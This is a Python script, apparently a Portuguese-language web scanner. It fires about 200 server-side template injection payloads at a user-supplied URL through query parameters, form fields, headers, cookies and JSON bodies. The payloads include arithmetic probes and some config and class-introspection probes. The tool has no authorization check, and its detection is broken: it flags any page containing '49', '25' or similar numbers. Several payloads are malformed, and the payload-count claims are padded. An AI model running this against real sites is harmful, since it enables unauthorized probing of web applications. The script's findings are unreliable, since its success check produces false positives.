#!/usr/bin/env python3
"""
SCANNER SSTI ULTRA - 200+ Payloads Funcionais
Técnicas: URL, Formulário, Headers, Cookies, Upload, API
"""

import os
import sys
import requests
import time
import json
import random
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import init, Fore, Back, Style

# Inicializar Colorama
init(autoreset=True)

class UltraSSTIScanner:
    def __init__(self):
        self.session = requests.Session()
        self.results = []
        self.vulnerable_points = []
        
        # Configurações
        self.timeout = 10
        self.delay = 0.1
        
        # 200+ Payloads organizados por técnica
        self.payloads = self._generate_payloads()
    
    def _generate_payloads(self):
        """Gera 200+ payloads funcionais organizados por técnica"""
        base_payloads = [
            # Expressões Matemáticas Básicas (30 payloads)
            '{{7*7}}', '${7*7}', '<%= 7*7 %>', '{7*7}', '[[${7*7}]]',
            '#{7*7}', '%{7*7}', '@{7*7}', '${173-26}', '{{173-26}}',
            '<%= 173-26 %>', '${49/1}', '{{49/1}}', '<%= 49/1 %>',
            '${7**2}', '{{7**2}}', '<%= 7**2 %>', '${8*8-15}', '{{8*8-15}}',
            '<%= 8*8-15 %>', '${100-51}}', '{{100-51}}', '<%= 100-51 %>',
            '${14*3+7}}', '{{14*3+7}}', '<%= 14*3+7 %>', '${98/2}}',
            '{{98/2}}', '<%= 98/2 %>', '${25+24}}',
            
            # Strings e Caracteres Especiais (25 payloads)
            '{{7*\'7\'}}', '${7*\'7\'}', '<%= \'7\'*7 %>', '{{\"7\"*7}}',
            '${\"7\"*7}', '<%= \"7\"*7 %>', "{{'7'*7}}", "${'7'*7}",
            "<%='7'*7%>", '{{`7`*7}}', '${`7`*7}', '{{7*`7`}}', '${7*`7`}',
            '{{"7"*7}}', '${"7"*7}', '<%="7"*7%>', '{{\'\'*7}}', '${\\'7\\'*7}',
            '{{"a"*7}}', '${"a"*7}', '<%="a"*7%>', '{{1*49}}', '${1*49}',
            '<%= 1*49 %>', '{{0+49}}',
            
            # Comentários e Quebras de Linha (20 payloads)
            '{{7*7}}<!--test-->', '${7*7}#test', '<%= 7*7 %>#test',
            '{{7*7}}/*test*/', '${7*7}/*test*/', '<!--{{7*7}}-->',
            '#{7*7}/*test*/', '{{7*7}}\n', '${7*7}\n', '<%= 7*7 %>\n',
            '{{7*7}}\\n', '${7*7}\\n', '{{7*7}}\r\n', '${7*7}}\r\n',
            '<%= 7*7 %>\r\n', '{{7*7}}\t', '${7*7}}\t', '{{7*7}} ',
            '${7*7}} ', '<%= 7*7 %> ',
            
            # Escape e Contexto (25 payloads)
            '{{7*7}}\'', '{{7*7}}"', '{{7*7}}`', '${7*7}\'', '${7*7}"',
            '${7*7}`', '<%= 7*7 %>\'', '<%= 7*7 %>"', '<%= 7*7 %>`',
            '{{7*7}};', '${7*7};', '<%= 7*7 %>;', '{{7*7}})', '${7*7})',
            '<%= 7*7 %>)', '{{7*7}}]', '${7*7}]', '<%= 7*7 %>]',
            '{{7*7}}>', '${7*7}}>', '<%= 7*7 %>>', '{{7*7}}<', 
            '${7*7}}<', '<%= 7*7 %><',
            
            # Polyglot e Multi-Template (30 payloads)
            '{{7*7}}${7*7}<%= 7*7 %>', '${7*7}{{7*7}}<%= 7*7 %>',
            '<%= 7*7 %>{{7*7}}${7*7}', '{{7*7}}/*${7*7}*/<%= 7*7 %>',
            '${7*7}}<!--{{7*7}}--><%= 7*7 %>', '{{7*7}}\'/*${7*7}*/`<%= 7*7 %>`',
            '{{7*7}}|${7*7}|<%= 7*7 %>', '${7*7}&{{7*7}}&<%= 7*7 %>',
            '<%= 7*7 %>+{{7*7}}+${7*7}', '{{7*7}};${7*7};<%= 7*7 %>',
            '${7*7}},{{7*7}},<%= 7*7 %>', '<%= 7*7 %>.{{7*7}}.${7*7}',
            '{{7*7}}/${7*7}/<%= 7*7 %>', '${7*7}\\{{7*7}}\\<%= 7*7 %>',
            '<%= 7*7 %>-{{7*7}}-${7*7}', '{{7*7}}%${7*7}%<%= 7*7 %>',
            '${7*7}#{{7*7}}#<%= 7*7 %>', '<%= 7*7 %>@{{7*7}}@${7*7}',
            '{{7*7}}!${7*7}!<%= 7*7 %>', '${7*7}}?{{7*7}}?<%= 7*7 %>',
            '<%= 7*7 %>={{7*7}}=${7*7}', '{{7*7}}:${7*7}:<%= 7*7 %>',
            '${7*7}}^{{7*7}}^<%= 7*7 %>', '<%= 7*7 %>~{{7*7}}~${7*7}',
            '{{7*7}}(${7*7})<%= 7*7 %>', '${7*7}}[{{7*7}}]<%= 7*7 %>',
            '<%= 7*7 %>{{7*7}}${7*7}', '{{7*7}}{${7*7}}<%= 7*7 %>',
            '${7*7}}<{{7*7}}><%= 7*7 %>', '<%= 7*7 %>\'{{7*7}}\'${7*7}',
            
            # Técnicas de Bypass (40 payloads)
            '{{7*7}}', '{{7*07}}', '{{7*007}}', '{{ 7 * 7 }}', '{{7*7 }}',
            '{{ 7*7}}', '{{7*7|safe}}', '{{7*7|escape}}', '${7*7}', 
            '${ 7 * 7 }', '${7*7 }', '<%= 7*7 %>', '<% = 7*7 %>', 
            '<%=7*7%>', '{{7*7}}/', '${7*7}}/', '<%= 7*7 %>/', 
            '{{7*7}}?', '${7*7}}?', '<%= 7*7 %>?', '{{7*7}}!', 
            '${7*7}}!', '<%= 7*7 %>!', '{{7*7}}.', '${7*7}}.', 
            '<%= 7*7 %>.', '{{7*7}}-', '${7*7}}-', '<%= 7*7 %>-',
            '{{7*7}}_', '${7*7}}_', '<%= 7*7 %>_', '{{7*7}}+', 
            '${7*7}}+', '<%= 7*7 %>+', '{{7*7}}=', '${7*7}}=', 
            '<%= 7*7 %>=', '{{7*7}}&', '${7*7}}&', '<%= 7*7 %>&',
            
            # Técnicas Avançadas (30 payloads)
            '{{config}}', '${config}', '<%= config %>', '{{settings}}',
            '${settings}', '<%= settings %>', '{{self}}', '${self}',
            '<%= self %>', '{{request}}', '${request}', '<%= request %>',
            '{{session}}', '${session}', '<%= session %>', '{{"".__class__}}',
            '${"".class}', '<%= "".class %>', '{{[].__class__}}',
            '${[].class}', '<%= [].class %>', '{{{}.__class__}}',
            '${{}.class}', '<%= {}.class %>', '{{().__class__}}',
            '${().class}', '<%= ().class %>', '{{true.__class__}}',
            '${true.class}', '<%= true.class %>',
        ]
        
        # Garantir que temos pelo menos 200 payloads únicos
        while len(base_payloads) < 200:
            for payload in base_payloads[:50]:  # Reutiliza os primeiros 50 com variações
                new_payload = payload.replace('7*7', f'{random.randint(5,9)}*{random.randint(5,9)}')
                if new_payload not in base_payloads:
                    base_payloads.append(new_payload)
                if len(base_payloads) >= 200:
                    break
        
        return base_payloads[:200]  # Retorna exatamente 200 payloads

    def clear_screen(self):
        """Limpa a tela"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        """Imprime banner colorido"""
        self.clear_screen()
        banner = f"""
{Fore.RED}
███████╗███████╗██████╗ ████████╗
██╔════╝██╔════╝██╔══██╗╚══██╔══╝
███████╗███████╗██████╔╝   ██║   
╚════██║╚════██║██╔══██╗   ██║   
███████║███████║██║  ██║   ██║   
╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   
                                 
{Style.RESET_ALL}
"""
        print(banner)

    def test_url_parameters(self, url, params=None):
        """Testa SSTI em parâmetros URL (GET)"""
        print(f"\n{Fore.CYAN}[🔍] TESTANDO PARÂMETROS URL...{Style.RESET_ALL}")
        
        if not params:
            # Tenta extrair parâmetros da URL ou usar padrão
            parsed = urlparse(url)
            if parsed.query:
                params = list(parse_qs(parsed.query).keys())
            else:
                params = ['q', 'search', 'id', 'name', 'query', 'term']
        
        tested = 0
        for param in params[:5]:  # Limita a 5 parâmetros para não ficar muito grande
            for i, payload in enumerate(self.payloads[:40]):  # 40 payloads por parâmetro
                try:
                    test_params = {param: payload}
                    response = self.session.get(
                        url, 
                        params=test_params, 
                        timeout=self.timeout
                    )
                    
                    if self.check_success(response, payload):
                        print(f"{Fore.GREEN}[✅] VULNERÁVEL - URL Param: {param} | Payload: {payload}{Style.RESET_ALL}")
                        self.vulnerable_points.append({
                            'type': 'URL Parameter',
                            'location': param,
                            'payload': payload,
                            'url': response.url
                        })
                    
                    tested += 1
                    print(f"{Fore.WHITE}[{tested}/200] Testando: {param}={payload[:20]}...{Style.RESET_ALL}", end='\r')
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue

    def test_form_data(self, url, form_fields=None):
        """Testa SSTI em formulários (POST)"""
        print(f"\n{Fore.CYAN}[📝] TESTANDO FORMULÁRIOS POST...{Style.RESET_ALL}")
        
        if not form_fields:
            form_fields = ['username', 'email', 'message', 'comment', 'content', 'input']
        
        tested = 0
        for field in form_fields[:5]:
            for i, payload in enumerate(self.payloads[:40]):
                try:
                    form_data = {field: payload}
                    response = self.session.post(
                        url,
                        data=form_data,
                        timeout=self.timeout
                    )
                    
                    if self.check_success(response, payload):
                        print(f"{Fore.GREEN}[✅] VULNERÁVEL - Form Field: {field} | Payload: {payload}{Style.RESET_ALL}")
                        self.vulnerable_points.append({
                            'type': 'Form Field',
                            'location': field,
                            'payload': payload,
                            'url': url
                        })
                    
                    tested += 1
                    print(f"{Fore.WHITE}[{tested}/200] Testando: {field}={payload[:20]}...{Style.RESET_ALL}", end='\r')
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue

    def test_headers(self, url):
        """Testa SSTI em cabeçalhos HTTP"""
        print(f"\n{Fore.CYAN}[📋] TESTANDO CABEÇALHOS HTTP...{Style.RESET_ALL}")
        
        headers_list = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
        
        tested = 0
        for header in headers_list:
            for i, payload in enumerate(self.payloads[:25]):  # 25 por header
                try:
                    headers = {header: payload}
                    response = self.session.get(
                        url,
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    if self.check_success(response, payload):
                        print(f"{Fore.GREEN}[✅] VULNERÁVEL - Header: {header} | Payload: {payload}{Style.RESET_ALL}")
                        self.vulnerable_points.append({
                            'type': 'HTTP Header',
                            'location': header,
                            'payload': payload,
                            'url': url
                        })
                    
                    tested += 1
                    print(f"{Fore.WHITE}[{tested}/200] Testando: {header}: {payload[:20]}...{Style.RESET_ALL}", end='\r')
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue

    def test_cookies(self, url):
        """Testa SSTI em cookies"""
        print(f"\n{Fore.CYAN}[🍪] TESTANDO COOKIES...{Style.RESET_ALL}")
        
        cookie_names = ['session', 'user', 'token', 'auth']
        
        tested = 0
        for cookie in cookie_names:
            for i, payload in enumerate(self.payloads[:25]):
                try:
                    cookies = {cookie: payload}
                    response = self.session.get(
                        url,
                        cookies=cookies,
                        timeout=self.timeout
                    )
                    
                    if self.check_success(response, payload):
                        print(f"{Fore.GREEN}[✅] VULNERÁVEL - Cookie: {cookie} | Payload: {payload}{Style.RESET_ALL}")
                        self.vulnerable_points.append({
                            'type': 'Cookie',
                            'location': cookie,
                            'payload': payload,
                            'url': url
                        })
                    
                    tested += 1
                    print(f"{Fore.WHITE}[{tested}/200] Testando: {cookie}={payload[:20]}...{Style.RESET_ALL}", end='\r')
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue

    def test_json_api(self, url):
        """Testa SSTI em APIs JSON"""
        print(f"\n{Fore.CYAN}[🔗] TESTANDO APIs JSON...{Style.RESET_ALL}")
        
        json_fields = ['name', 'username', 'email', 'query', 'search']
        
        tested = 0
        for field in json_fields:
            for i, payload in enumerate(self.payloads[:20]):
                try:
                    json_data = {field: payload}
                    headers = {'Content-Type': 'application/json'}
                    
                    response = self.session.post(
                        url,
                        json=json_data,
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    if self.check_success(response, payload):
                        print(f"{Fore.GREEN}[✅] VULNERÁVEL - JSON Field: {field} | Payload: {payload}{Style.RESET_ALL}")
                        self.vulnerable_points.append({
                            'type': 'JSON API',
                            'location': field,
                            'payload': payload,
                            'url': url
                        })
                    
                    tested += 1
                    print(f"{Fore.WHITE}[{tested}/200] Testando JSON: {field}: {payload[:20]}...{Style.RESET_ALL}", end='\r')
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue

    def check_success(self, response, payload):
        """Verifica se o payload foi executado com sucesso"""
        success_indicators = [
            '49',  # 7*7
            '25',  # 5*5
            '36',  # 6*6
            '64',  # 8*8
            '81',  # 9*9
        ]
        
        for indicator in success_indicators:
            if indicator in response.text:
                return True
        return False

    def run_complete_scan(self, url):
        """Executa varredura completa"""
        self.print_banner()
        
        print(f"{Fore.YELLOW}[🎯] ALVO: {url}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[📊] TOTAL DE PAYLOADS: {len(self.payloads)}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[⏱] INICIANDO SCAN EM 3 SEGUNDOS...{Style.RESET_ALL}")
        time.sleep(3)
        
        start_time = time.time()
        
        # Executa todos os testes
        self.test_url_parameters(url)
        self.test_form_data(url)
        self.test_headers(url)
        self.test_cookies(url)
        self.test_json_api(url)
        
        end_time = time.time()
        
        # Mostra resultados
        self.show_results(start_time, end_time)

    def show_results(self, start_time, end_time):
        """Mostra resultados finais"""
        print(f"\n{Fore.CYAN}" + "="*60)
        print("📊 RESULTADOS DA VARREdura SSTI")
        print("="*60 + f"{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}✅ Pontos Vulneráveis Encontrados: {len(self.vulnerable_points)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⏱ Tempo de Execução: {end_time - start_time:.2f} segundos{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🎯 Total de Payloads Testados: ~200{Style.RESET_ALL}")
        
        if self.vulnerable_points:
            print(f"\n{Fore.RED}🚨 VULNERABILIDADES ENCONTRADAS:{Style.RESET_ALL}")
            for vuln in self.vulnerable_points:
                print(f"{Fore.GREEN}► {vuln['type']}: {vuln['location']}")
                print(f"  Payload: {vuln['payload']}")
                print(f"  URL: {vuln['url']}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}🎉 Nenhuma vulnerabilidade SSTI encontrada!{Style.RESET_ALL}")

def main():
    scanner = UltraSSTIScanner()
    scanner.print_banner()
    
    try:
        print(f"{Fore.CYAN}[?] Digite a URL alvo: {Style.RESET_ALL}", end='')
        target_url = input().strip()
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        print(f"\n{Fore.YELLOW}[!] Iniciando varredura SSTI completa...{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Este processo testará 200+ payloads em diferentes técnicas{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Pode demorar alguns minutos...{Style.RESET_ALL}")
        
        scanner.run_complete_scan(target_url)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrompido pelo usuário{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
